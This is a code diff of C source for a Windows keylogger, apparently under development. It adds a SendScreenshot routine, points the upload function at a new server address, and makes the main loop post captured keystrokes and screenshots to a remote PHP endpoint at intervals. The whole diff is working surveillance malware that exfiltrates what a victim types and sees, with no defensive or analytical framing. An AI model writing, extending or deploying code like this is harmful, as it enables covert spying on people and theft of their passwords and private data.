@@ -146,6 +146,7 @@ BOOL SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int he
     if (Written < sizeof(bmfh)) 
         return FALSE;
 
+	CloseHandle(BmpFile);
     return TRUE;
     }
     
@@ -177,7 +178,7 @@ int FileSend(char *data, int length)
 	return 1;
 }
 
-int CurlSend(char *data, int length)
+int CurlSend(char *data, int length, char *postParamName)
 {
 	CURL *curl;
 	CURLcode res;
@@ -188,14 +189,14 @@ int CurlSend(char *data, int length)
 	
 	if(curl)
 	{
-		char *inputStr = "input=";
+		char *inputStr = postParamName;
 		char *httpStr = curl_easy_escape(curl, data, length);
 		
 		char *sendStr = (char *)malloc(strlen(inputStr) + strlen(httpStr) + 1);
 		strcpy(sendStr, inputStr);
 		strcat(sendStr, httpStr);
 		
-		curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.100/send/send.php");
+		curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.43.175/send/send.php");
 		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sendStr);
 		res = curl_easy_perform(curl);
 		curl_easy_cleanup(curl);
@@ -285,12 +286,31 @@ DWORD WINAPI KeyLogger()
 	return 0;
 }
 
+void SendScreenshot()
+{
+	ScreenCapture("data");
+	
+	FILE *img = fopen("data", "rb");
+	
+	if(img > 0)
+	{
+		fseek(img, 0, SEEK_END);
+		long len = ftell(img);
+		fseek(img, 0, SEEK_SET);
+		
+		if(len > 0)
+		{
+			char *image = (char *)malloc(len);
+			fread(image, 1, len, img);
+			CurlSend(image, len, "image=");
+			free(image);
+		}
+		fclose(img);
+	}
+}
 
 int main(void)
-{
-	ScreenCapture("test.bmp");
-	
-			
+{			
 	mutex = CreateMutex(NULL, FALSE, NULL);
 	
 	buffer = (char*)malloc(BUFFERLEN);
@@ -306,7 +326,8 @@ int main(void)
 	{
 		if(timer > 10)
 		{
-
+			SendScreenshot();
+			
 			// lock
 			WaitForSingleObject(mutex, INFINITE);
 			
@@ -315,7 +336,7 @@ int main(void)
 			// unlock
 			ReleaseMutex(mutex);
 			
-			int res = CurlSend(buffer, len);
+			int res = CurlSend(buffer, len, "text=");
 			if(res)
 			{
 				// lock
